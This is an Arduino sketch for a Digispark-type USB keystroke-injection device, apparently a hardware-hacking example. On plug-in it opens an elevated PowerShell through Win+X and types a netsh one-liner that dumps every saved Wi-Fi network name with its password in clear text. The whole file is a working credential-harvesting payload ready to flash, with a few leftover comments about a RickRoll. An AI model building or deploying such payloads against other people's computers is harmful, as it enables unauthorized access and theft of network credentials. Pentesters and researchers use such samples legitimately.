#include <Arduino.h>
#include <DigiKeyboardMultilang.h>
#include <extendedLanguages.h>  // ExtendedLanguages - provides lang_de, lang_fr, lang_gr so far

DigiKeyboardMultilang keyboard(lang_de); // IMPORTANT Declare keyboard layout! e.g., lang_us for US English

const char* runCmdPld = "netsh wlan show profiles|sls 'All.*P\\w*\\s*:\\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();$p=(netsh wlan show profile name=\"$n\" key=clear|sls 'K\\w*\\s*C\\w*\\s*:\\s*(.+)$').Matches[0].Groups[1].Value.Trim();\"${n}:$p\"} 2>$null|sort -Unique"; // dump wifi creds in PowerShell terminal example

int redLED = 1;

void setup() {
    pinMode(redLED, OUTPUT); // Initialize the RED LED pin as an output
    digitalWrite(redLED, HIGH); // Turn on the RED LED while executing payload
    
    // --- THE HID INJECTION STARTS HERE ---
    keyboard.delay(6000); // Wait 6 seconds to allow the OS to recognize the device and install drivers if needed
    keyboard.sendKeyStroke(KEY_X, KEY_MOD_GUI); // Win+X (KEY_MOD_GUI = Windows/Command key)
    keyboard.delay(800); // Wait 0.8 seconds for the run dialog to open
    keyboard.println("a"); // Open a RickRoll url in the run dialog
    keyboard.delay(800); // Wait 0.8 seconds for the browser to open
    keyboard.sendKeyStroke(KEY_LEFT); // Move to beginning of line
    keyboard.delay(300); // Wait 0.3 seconds for the browser to open
    keyboard.sendKeyStroke(KEY_ENTER); // Execute command
    keyboard.delay(2000); // Wait 2 seconds for the browser to open
    keyboard.println(runCmdPld); // dump wifi creds in PowerShell terminal example
    // --- THE HID INJECTION ENDS HERE ---
    
    digitalWrite(redLED, LOW); // Turn off the RED LED after executing payload
}

void loop() {
    // the loop function is intentionally left empty But if you want to repeat the payload,
    // you can add code here with your desired logic and delays instead of in setup().
}